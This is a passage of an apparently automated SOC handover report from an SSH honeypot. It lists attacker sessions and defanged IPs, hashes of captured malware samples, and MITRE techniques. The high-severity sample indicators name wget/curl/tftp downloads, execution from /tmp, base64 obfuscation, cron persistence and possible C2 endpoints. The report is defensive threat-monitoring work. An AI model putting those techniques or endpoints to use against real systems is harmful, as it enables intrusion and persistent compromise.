| **First Seen** | 2026-06-30 12:51 |
| **Last Seen** | 2026-06-30 12:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:51:59` | `cowrie.session.connect` |
| `2026-06-30 12:51:59` | `cowrie.client.version` |
| `2026-06-30 12:51:59` | `cowrie.client.kex` |
| `2026-06-30 12:52:01` | `cowrie.login.success` |
| `2026-06-30 12:52:03` | `cowrie.session.params` |
| `2026-06-30 12:52:03` | `cowrie.command.input` |
| `2026-06-30 12:52:03` | `cowrie.log.closed` |
| `2026-06-30 12:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-251ac4845af5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 12:54 |
| **Last Seen** | 2026-06-30 12:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:54:18` | `cowrie.session.connect` |
| `2026-06-30 12:54:18` | `cowrie.client.version` |
| `2026-06-30 12:54:18` | `cowrie.client.kex` |
| `2026-06-30 12:54:18` | `cowrie.login.success` |
| `2026-06-30 12:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-814ac97e33f9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 12:54 |
| **Last Seen** | 2026-06-30 12:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:54:19` | `cowrie.session.connect` |
| `2026-06-30 12:54:19` | `cowrie.client.version` |
| `2026-06-30 12:54:19` | `cowrie.client.kex` |
| `2026-06-30 12:54:19` | `cowrie.login.success` |
| `2026-06-30 12:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9baf898579b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 12:54 |
| **Last Seen** | 2026-06-30 12:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:54:20` | `cowrie.session.connect` |
| `2026-06-30 12:54:20` | `cowrie.client.version` |
| `2026-06-30 12:54:20` | `cowrie.client.kex` |
| `2026-06-30 12:54:20` | `cowrie.login.success` |
| `2026-06-30 12:54:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f442413f7c47

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 12:54 |
| **Last Seen** | 2026-06-30 12:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:54:20` | `cowrie.session.connect` |
| `2026-06-30 12:54:20` | `cowrie.client.version` |
| `2026-06-30 12:54:20` | `cowrie.client.kex` |
| `2026-06-30 12:54:20` | `cowrie.login.success` |
| `2026-06-30 12:54:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.76.137[.]133` | **30** | 2026-06-30 12:50 | 2026-06-30 12:51 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **7** | 2026-06-30 11:14 | 2026-06-30 12:11 | 8m | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]165` | **2** | 2026-06-30 11:29 | 2026-06-30 11:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.54.12[.]220` | 1 | 2026-06-30 11:12 | 2026-06-30 11:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.91.141[.]230` | 1 | 2026-06-30 12:49 | 2026-06-30 12:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]21` | 1 | 2026-06-30 12:31 | 2026-06-30 12:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.248[.]35` | 1 | 2026-06-30 10:59 | 2026-06-30 10:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]209` | 1 | 2026-06-30 11:10 | 2026-06-30 11:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.83[.]214` | 1 | 2026-06-30 11:08 | 2026-06-30 11:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.105.139[.]67` | 1 | 2026-06-30 11:08 | 2026-06-30 11:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]81` | 1 | 2026-06-30 12:25 | 2026-06-30 12:26 | 59s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-06-30 11:26 | 2026-06-30 11:27 | 36s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]80` | 1 | 2026-06-30 11:21 | 2026-06-30 11:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.212.83[.]51` | 1 | 2026-06-30 10:59 | 2026-06-30 11:00 | 31s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-06-30 11:03 | 2026-06-30 11:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-06-30 12:33 | 2026-06-30 12:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-06-30 11:05 | 2026-06-30 11:06 | 69s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-06-30 11:52 | 2026-06-30 11:53 | 39s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 76/100 | 🔴 HIGH | **17/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 63/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `d16bffbd3ba31504aea1fc01e66e29ad5927830ea5e2cc49369e82a7c68ec5c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `114.220.238[.]21` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 4 |
| `34.76.137[.]133` | BE | Google LLC | **100** ⚠️ | 1 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `107.174.82[.]77` | US | HostPapa | **100** ⚠️ | 7 |
| `112.91.141[.]230` | CN | China Unicom Guangdong province network | **100** ⚠️ | 5 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `185.247.137[.]165` | GB | Driftnet Ltd | **100** ⚠️ | 48 |
| `222.212.83[.]51` | CN | CHINANET Sichuan province network | **100** ⚠️ | 15 |
| `124.223.187[.]91` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 54 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 51 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 107 cases |
| Tool 34  | Credential Extractor        | ✅ 62 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (9.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 40 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 43 priority case(s) shown individually · 18 recon entry/entries in table (3 group(s) consolidating 39 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-30T14:28:23Z_
